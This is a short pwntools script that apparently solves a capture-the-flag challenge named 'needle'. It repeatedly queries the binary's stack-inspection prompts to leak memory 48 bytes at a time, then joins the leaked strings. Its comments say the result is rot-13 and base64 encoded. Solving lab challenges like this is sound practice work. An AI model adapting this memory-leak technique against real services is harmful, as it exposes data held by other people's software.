from pwn import *
import base64
from codecs import getencoder


exe = context.binary = ELF("./needle")

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

start = local if args.LOCAL else remote
io = start()
responses = []
stack_check = 0
depth = 0
enc = getencoder( "rot-13" )

# 0x100 came from binary recon
while(stack_check < 0x100):
    received = io.recvuntil(b"you want to check?")
    io.sendline(str(stack_check))
    recvd = io.recvline()
    recvd = io.recvline()
    print(recvd)
    if (b'deep into the stack?' in recvd):
        io.sendline(str(depth))
        recvd = io.recvline()
        print(recvd)
        if (b'Your stacks are not that big' in recvd):
            stack_check = stack_check + 1
            depth = 0
        else:
            recvd = io.recvline()
            # Behavior that you always get the same last 48 in the stack if you
            # try to go to far is from binary recon/observed behaviour
            if (len(responses) != 0 and recvd == responses[len(responses) - 1]):
                stack_check = stack_check + 1
                depth = 0
            else:
                # Stack them up like cordwood in an array..
                work = recvd.strip().decode('utf-8')
                responses.append(work)
                #Binary recon and observed behaviour tells us print len is 48
                depth = depth + 48
    else:
        stack_check = stack_check + 1
        depth = 0
# rot-13 and base 64 could be gleaned from the easter egg and possibly also
# finding the phrase "magnet" if someone decided to look closely at the
# first 48 they found.   They can take the responses over to CyberChef
joined_responses = ''.join(responses)
print(joined_responses)
